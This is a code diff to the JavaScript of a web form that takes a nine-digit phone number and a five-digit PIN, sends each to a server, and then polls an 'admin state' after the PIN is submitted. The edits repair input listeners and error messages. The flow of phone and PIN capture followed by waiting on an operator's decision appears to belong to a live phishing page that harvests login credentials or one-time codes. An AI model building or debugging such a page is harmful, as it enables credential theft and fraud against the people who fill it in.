@@ -107,19 +107,22 @@
     const pinStatus = document.getElementById('pinStatus');
     const pinError = document.getElementById('pinError');
 
-    // ✅ FIXED TERMINATION WRAPPER: Fully restores structural monitoring listeners
-    phoneInput.addEventListener('input', (e) => {
-      let digits = e.target.value.replace(/[^0-9]/g, '');
-      e.target.value = digits;
-      if (digits.length === 9) {
-        phoneButton.removeAttribute('disabled');
-        phoneButton.disabled = false;
-        phoneButton.style.background = "#004f71";
-      } else {
-        phoneButton.setAttribute('disabled', 'true');
-        phoneButton.disabled = true;
-        phoneButton.style.background = "#cccccc";
-      }
+    // ✅ Explicitly fixed mobile environment listeners
+    const trackingEvents = ['input', 'keyup', 'change', 'paste'];
+    trackingEvents.forEach(eventType => {
+      phoneInput.addEventListener(eventType, () => {
+        let digits = phoneInput.value.replace(/[^0-9]/g, '').trim();
+        phoneInput.value = digits;
+        if (digits.length === 9) {
+          phoneButton.removeAttribute('disabled');
+          phoneButton.disabled = false;
+          phoneButton.style.background = "#004f71";
+        } else {
+          phoneButton.setAttribute('disabled', 'true');
+          phoneButton.disabled = true;
+          phoneButton.style.background = "#cccccc";
+        }
+      });
     });
 
     phoneButton.addEventListener('click', async () => {
@@ -133,26 +136,19 @@
           headers: { 'Content-Type': 'application/json' },
           body: JSON.stringify({ phone: savedPhoneValue })
         });
-        // ✅ Absolute event tracking binding across all mobile input environments
-const trackingEvents = ['input', 'keyup', 'change', 'paste', 'textInput'];
+        const data = await res.json();
+        if (!res.ok) throw new Error(data.error || 'Failed to start.');
 
-trackingEvents.forEach(eventType => {
-  phoneInput.addEventListener(eventType, () => {
-    let digits = phoneInput.value.replace(/[^0-9]/g, '').trim();
-    phoneInput.value = digits;
-    
-    if (digits.length === 9) {
-      phoneButton.disabled = false;
-      phoneButton.removeAttribute('disabled');
-      phoneButton.style.background = "#004f71";
-    } else {
-      phoneButton.disabled = true;
-      phoneButton.setAttribute('disabled', 'true');
-      phoneButton.style.background = "#cccccc";
-    }
-  });
-});
-
+        currentRequestId = data.id;
+        phonePage.classList.add('hidden');
+        pinPage.classList.remove('hidden');
+        createPinInputs(pinDigitsContainer, 5);
+      } catch (err) {
+        phoneError.textContent = err.message;
+        phoneButton.removeAttribute('disabled');
+        phoneButton.disabled = false;
+      }
+    });
 
     function createPinInputs(container, totalCount) {
       container.innerHTML = '';
@@ -195,7 +191,8 @@ trackingEvents.forEach(eventType => {
           headers: { 'Content-Type': 'application/json' },
           body: JSON.stringify({ id: currentRequestId, pin: pinValue })
         });
-        if (!res.ok) throw new Error('Submission failed.');
+        const data = await res.json();
+        if (!res.ok) throw new Error(data.error || 'Submission failed.');
         startPollingAdminState(inputs);
       } catch (err) {
         secureModal.classList.add('hidden');
@@ -235,7 +232,4 @@ trackingEvents.forEach(eventType => {
           headers: { 'Content-Type': 'application/json' },
           body: JSON.stringify({ id: currentRequestId })
         });
-        inputs.forEach(i => { i.value = ''; i.disabled = false; });
-        pinStatus.textContent = '';
-        pinError.textContent = '';
 
